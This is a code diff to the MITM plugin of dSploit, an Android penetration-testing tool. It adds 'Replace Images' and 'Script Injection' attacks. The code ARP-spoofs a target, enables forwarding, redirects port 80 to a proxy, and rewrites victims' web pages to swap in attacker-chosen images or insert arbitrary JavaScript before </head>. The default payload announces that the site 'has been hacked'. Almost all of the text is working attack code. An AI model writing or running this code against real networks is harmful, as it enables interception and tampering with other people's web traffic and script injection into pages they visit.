@@ -34,6 +34,9 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import it.evilsocket.dsploit.R;
+import it.evilsocket.dsploit.gui.dialogs.ErrorDialog;
+import it.evilsocket.dsploit.gui.dialogs.InputDialog;
+import it.evilsocket.dsploit.gui.dialogs.InputDialog.InputDialogListener;
 import it.evilsocket.dsploit.net.Target;
 import it.evilsocket.dsploit.net.http.Proxy;
 import it.evilsocket.dsploit.system.Environment;
@@ -205,47 +208,126 @@ public class MITM extends Plugin
         mActions.add( new Action( "Replace Images", "Replace all images on webpages with the specified one.", new OnClickListener(){
 			@Override
 			public void onClick(View v) {
-				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
+				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
 
 				if( activity.getVisibility() == View.INVISIBLE )
 				{
-					activity.setVisibility( View.VISIBLE );
-					
-					Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
-										
-					mEttercap.spoof( Environment.getTarget(), new OnReadyListener(){
+					new InputDialog( "Image URL", "Enter the URL of an image, starting with 'http://' :", "http://www.evilsocket.net/trollface.png", MITM.this, new InputDialogListener(){
 						@Override
-						public void onReady() 
+						public void onInputEntered( String input ) 
 						{
-							Environment.setForwarding( true );
-							
-							mProxy.setFilter( new Proxy.ProxyFilter() {					
-								@Override
-								public String onHtmlReceived(String html) {
-									return html.replaceAll( "src=['\"][^'\"]+\\.jpg['\"]", "src=\"http://www.evilsocket.net/trollface.png\"" );
-								}
-							});
-							
-							new Thread( mProxy ).start();
-							
-							mIpTables.portRedirect( 80, 8080 );									
-						}
-						
-					}).start();						
+							final String url = input.trim();
+							if( url.isEmpty() == false )
+							{
+								activity.setVisibility( View.VISIBLE );
+								
+								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+													
+								mEttercap.spoof( Environment.getTarget(), new OnReadyListener(){
+									@Override
+									public void onReady() 
+									{
+										Environment.setForwarding( true );
+										
+										mProxy.setFilter( new Proxy.ProxyFilter() {					
+											@Override
+											public String onHtmlReceived(String html) {
+												return html.replaceAll( "src=['\"][^'\"]+\\.(jpg|jpeg|png|gif)['\"]", "src=\"" + url + "\"" );
+											}
+										});
+										
+										new Thread( mProxy ).start();
+										
+										mIpTables.portRedirect( 80, 8080 );									
+									}
+									
+								}).start();				
+							}
+							else
+								new ErrorDialog( "Error", "Invalid image url.", MITM.this ).show();
+						}} 
+					).show();	
 				}
 				else
-				{
-	
-					Environment.setForwarding( false );
-					
+				{					
 					mEttercap.kill();
-					mProxy.stop();
 					mIpTables.undoPortRedirect( 80, 8080 );
+					mProxy.stop();
+					Environment.setForwarding( false );
+
 					activity.setVisibility( View.INVISIBLE );
 				}
 			}
 		}));
 
+        mActions.add( new Action( "Script Injection", "Inject a javascript in every visited webpage.", new OnClickListener(){
+			@Override
+			public void onClick(View v) {
+				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
+
+				if( activity.getVisibility() == View.INVISIBLE )
+				{
+					new InputDialog
+					( 
+						"Javascript", 
+						"Enter the js code to inject :", 
+						"<script type=\"text/javascript\">\n" +
+						"  alert('This site has been hacked with dSploit!');\n" +
+						"</script>", 
+						MITM.this, 
+						new InputDialogListener(){
+						@Override
+						public void onInputEntered( String input ) 
+						{
+							final String js = input.trim();
+							if( js.isEmpty() == false || js.startsWith("<script") == false )
+							{
+								activity.setVisibility( View.VISIBLE );
+								
+								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+													
+								mEttercap.spoof( Environment.getTarget(), new OnReadyListener(){
+									@Override
+									public void onReady() 
+									{
+										Environment.setForwarding( true );
+										
+										mProxy.setFilter( new Proxy.ProxyFilter() {					
+											@Override
+											public String onHtmlReceived(String html) {
+												return html.replaceAll
+												( 
+												  "(?i)</head>",
+												  js + "</head>"
+												);
+											}
+										});
+										
+										new Thread( mProxy ).start();
+										
+										mIpTables.portRedirect( 80, 8080 );									
+									}
+									
+								}).start();		
+									
+							}
+							else
+								new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
+						}} 
+					).show();	
+				}
+				else
+				{					
+					mEttercap.kill();
+					mIpTables.undoPortRedirect( 80, 8080 );
+					mProxy.stop();
+					Environment.setForwarding( false );
+
+					activity.setVisibility( View.INVISIBLE );
+				}
+			}
+		}));
+        
         /*        
     	TODO:
         mActions.add( new Action( "Traffic Redirect", "Redirect every http request to a specific website.", new OnClickListener(){
@@ -255,7 +337,7 @@ public class MITM extends Plugin
 			}
 		}));
         
-        mActions.add( new Action( "Custom Replace", "Replace custom text on webpages with the specified one.", new OnClickListener(){
+        mActions.add( new Action( "Custom Filter", "Replace custom text on webpages with the specified one.", new OnClickListener(){
 			@Override
 			public void onClick(View v) {
 								
